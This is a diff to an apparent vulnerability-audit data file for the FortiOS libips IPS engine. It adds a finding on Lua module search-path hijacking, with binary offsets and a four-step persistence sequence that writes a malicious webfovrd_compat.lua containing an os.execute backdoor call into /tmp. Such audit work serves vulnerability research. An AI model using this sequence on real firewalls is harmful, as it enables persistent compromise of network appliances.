@@ -930,7 +930,61 @@ LIBIPS_F02_LUAJIT_CVE_AUDIT = {
         "6. jit.opt.start() abuse -- JIT IR stress (instability), MEDIUM",
     ],
 
-    "scope": "FortiOS 7.2.0 libips.so.new confirmed; LIBIPS-F01 cross-version confirms same surface in 7.0.13; dlopen specific to 7.2.0 binary (verify in 7.0.13 dynstr)",
+    "cross_version_dlopen": {
+        "7013": "dlopen at dynstr+0xb20 CONFIRMED -- dlopen injection path applies cross-version",
+        "7020": "dlopen at dynstr+0xc1f CONFIRMED",
+    },
+
+    "scope": "FortiOS 7.2.0 and 7.0.13 libips.so.new confirmed; dlopen confirmed in both versions; LuaJIT beta3 vintage specific to 7.2.0",
+}
+
+
+# ---------------------------------------------------------
+# LIBIPS-F03: webfovrd_compat.lua CWD-relative injection (FortiOS 7.0.13 libips)
+# ---------------------------------------------------------
+LIBIPS_F03_WEBFOVRD_LUA_INJECTION = {
+    "id":       "LIBIPS-F03",
+    "product":  "FortiOS 7.0.13 libips.so.new -- webfovrd_compat Lua module load from CWD-relative path",
+    "severity": "MEDIUM -- persistence vector; requires prior code execution (LIBIPS-F01) to set up",
+    "class":    "Lua module search path hijack via CWD + os.chdir()",
+
+    "trigger_strings": {
+        "init_log":  "FO 0x6c85bb: '[%d@%d]%s: initialize webfovrd_compat module\\n'",
+        "error_log": "FO 0x6c85eb: '[%d@%d]%s: error loading webfovrd_compat.lua\\n'",
+        "load_site": "FO 0x1b0545: lea rsi, [rip+0x517632] (='webfovrd_compat'); call 0x155f50 (ips_lua_require)",
+    },
+
+    "lua_search_path": "./?.lua;/usr/local/share/luajit-2.1/?.lua;/usr/local/share/lua/5.1/?.lua;/usr/local/share/lua/5.1/?/init.lua",
+
+    "cwd_hijack_path": {
+        "os_chdir_va":    "0x2ccc2e: call 0x6ce20 (chdir PLT); argument from Lua string NaN-boxed at [rax+0x18]",
+        "os_chdir_avail": "os.chdir() IS accessible in IPS Lua (confirmed via libips NaN-boxing + chdir PLT call pattern)",
+        "attack_sequence": [
+            "1. Gain Lua eval in IPS engine via LIBIPS-F01 (config injection path)",
+            "2. os.chdir('/tmp/') -- change CWD to /tmp/ (world-writable tmpfs)",
+            "3. io.open('/tmp/webfovrd_compat.lua', 'w'):write('os.execute(\"/bin/backdoor &\")') -- write malicious module",
+            "4. On next IPS engine restart, ./webfovrd_compat.lua loads from /tmp/ and executes",
+        ],
+        "persistence_class": "Lua module hijack for IPS engine persistence across restarts",
+        "dependency":        "Requires prior LIBIPS-F01 execution (os.execute/io.write available in IPS Lua)",
+    },
+
+    "ipc_path": {
+        "second_chdir_va": "0x2d8fb5: chdir called after fork/exec pattern; may be daemon CWD management",
+        "tmp_usage":       "FO 0x6b1de9: '/tmp/ipscfgshm.%s' -- IPS creates shared memory files in /tmp/",
+        "writable_path":   "/tmp/ is confirmed tmpfs path in IPS engine; CWD-relative Lua search works if chdir('/tmp/') called",
+    },
+
+    "note": (
+        "webfovrd_compat.lua is NOT present in extracted 7.0.13 or 7.2.0 firmware. "
+        "The error path 'error loading webfovrd_compat.lua' confirms the module is optional -- "
+        "IPS continues without it. This makes the injection a persistence vector: "
+        "an attacker places the file after initial compromise; on restart it auto-loads. "
+        "Stronger than just placing a cron job since it runs as the IPS engine, "
+        "not as a scheduled task."
+    ),
+
+    "scope": "FortiOS 7.0.13 confirmed; 7.2.0 binary lacks webfovrd_compat string (may have different module name)",
 }
 
 
